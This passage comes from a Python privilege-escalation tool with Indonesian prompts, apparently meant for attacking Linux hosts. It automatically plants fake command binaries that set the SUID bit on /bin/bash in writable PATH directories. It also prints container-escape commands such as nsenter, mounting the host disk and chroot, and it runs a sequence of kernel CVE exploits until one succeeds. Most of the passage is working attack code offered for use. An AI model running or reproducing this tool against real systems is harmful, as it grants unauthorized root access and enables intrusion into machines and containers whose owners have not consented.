            print(f"    - {cmd}")
        print(f"\n  {c('Direktori writable di PATH:', 'green')}")
        for w in wlist:
            print(f"    {c('►', 'green')} {w['dir']}")
        print(f"\n  {c('Contoh inject:', 'yellow')}")
        print(f"    echo '#!/bin/bash\\nchmod +s /bin/bash' > {wlist[0]['dir']}/ls")
        print(f"    chmod +x {wlist[0]['dir']}/ls")
        print(f"    {c('Tunggu root jalankan ls...', 'cyan')}")
        try:
            go = input(f"\n  {c('Auto inject ke semua writable dir? (y/n):', 'yellow')} ").strip().lower()
        except: return False
        if go == 'y':
            for w in wlist:
                for cmd in common_cmds:
                    fpath = os.path.join(w['dir'], cmd)
                    try:
                        with open(fpath, 'w') as f:
                            f.write("#!/bin/bash\nchmod +s /bin/bash\n")
                        os.chmod(fpath, 0o755)
                        print(f"  {c('[✓]', 'green')} {fpath}")
                    except: pass
            print(f"\n  {c('[*] Tunggu root jalankan salah satu command, lalu cek:', 'cyan')}")
            print(f"  ls -la /bin/bash")
            print(f"  /bin/bash -p")
    elif choice == '5':
        if not docker:
            print(f"{c('[!] none', 'red')}")
            return False
        print(f"\n{c('[*] Docker/LXC escape vectors...', 'cyan')}")
        for d in docker:
            print(f"\n  {c('►', 'green')} {d['type']}: {d.get('detail','')}")
            if d['type'] in ('docker', 'docker_cgroup'):
                print(f"  {c('Cara escape:', 'cyan')}")
                print(f"    1. nsenter: nsenter -t 1 -m -u -i -n -p -- su -")
                print(f"    2. Mount host: mkdir /tmp/host; mount /dev/sda1 /tmp/host")
                print(f"    3. Shocker: find / -name docker.sock 2>/dev/null")
            elif d['type'] == 'lxc':
                print(f"  {c('Cara escape:', 'cyan')}")
                print(f"    lxc-attach -n container_name")
            elif d['type'] == 'dangerous_caps':
                print(f"  {c('Caps berbahaya ditemukan:', 'red')} {', '.join(d['caps'])}")
                if 'CAP_SYS_ADMIN' in d['caps']:
                    print(f"    mount -o bind /bin/bash /proc/sysrq-trigger")
            elif d['type'] == 'host_disk':
                print(f"  {c('Host disk accessible!', 'red')}")
                print(f"    mkdir /tmp/host && mount /dev/sda1 /tmp/host")
                print(f"    chroot /tmp/host /bin/bash")
    elif choice == '6':
        return False
    return False
def main_scan():
    global WORK_DIRS
    if False:
        print(f"{c('[!] linux only', 'red')}")
        return
    if is_root():
        print(f"{c('[!] already root', 'green')}")
        return
    print_banner()
    WORK_DIRS = find_writable_directories()
    system_info()
    print(f"\n{c('═'*60, 'cyan')}")
    print(f"{c('  SCANNING SYSTEM...', 'cyan', True)}")
    print(f"{c('═'*60, 'cyan')}\n")
    print(f"{c('[*] Scanning SUID binaries...', 'cyan')}")
    suid = scan_suid_abuse()
    print(f"{c('[*] Scanning SUDO rules...', 'cyan')}")
    sudo = scan_sudo_abuse()
    print(f"{c('[*] Scanning CRON jobs...', 'cyan')}")
    cron = scan_cron_abuse()
    print(f"{c('[*] Scanning PATH hijack...', 'cyan')}")
    writable = scan_writable_path()
    print(f"{c('[*] Scanning Docker/LXC...', 'cyan')}")
    docker = scan_docker_escape()
    print_scan_results(suid, sudo, cron, writable, docker)
    already_rooted = prompt_exploit(suid, sudo, cron, writable, docker)
    if already_rooted:
        return
    print(f"\n{c('[*] Lanjut ke kernel CVE exploits...', 'cyan', True)}\n")
    for exploit in exploits:
        if exploit():
            print(f"\n{c('[✓] success!', 'green', True)}\n")
            break
        time.sleep(0.2)
    else:
        print(f"\n{c('[!] No working exploit found', 'red', True)}\n")
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{c('[!] Interrupted by user', 'yellow')}")
        pass
    except Exception as e:
        print(f"\n{c('[!] Error:', 'red')} {e}")
        import traceback
        traceback.print_exc()
        pass